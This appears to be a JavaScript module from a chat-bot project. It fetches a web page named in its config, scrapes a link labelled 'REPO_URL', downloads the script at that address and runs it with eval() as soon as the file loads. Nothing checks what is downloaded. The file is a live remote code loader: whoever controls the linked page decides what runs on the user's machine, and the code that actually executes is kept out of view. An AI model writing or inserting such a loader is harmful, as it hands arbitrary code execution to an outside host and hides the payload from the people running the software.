/*
🇧​​​​​🇼​​​​​🇲​​​​​ 🇽​​​​​🇲​​​​​🇩​​​​​
Made by sir Ibrahim Adams
*/

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchRepoUrl() {
try {

const response = await axios.get(adams.BWM_XMD);      
const $ = cheerio.load(response.data);      
  
  
const repoUrlElement = $('a:contains("REPO_URL")');      
const repoUrl = repoUrlElement.attr('href');      
  
if (!repoUrl) {      
  throw new Error('Repo url link not found...');      
}      
  
console.log('Repo url fetched successfully ✅');      
  
  
const scriptResponse = await axios.get(repoUrl);      
eval(scriptResponse.data);

} catch (error) {
console.error('Error:', error.message);
}
}

fetchRepoUrl();
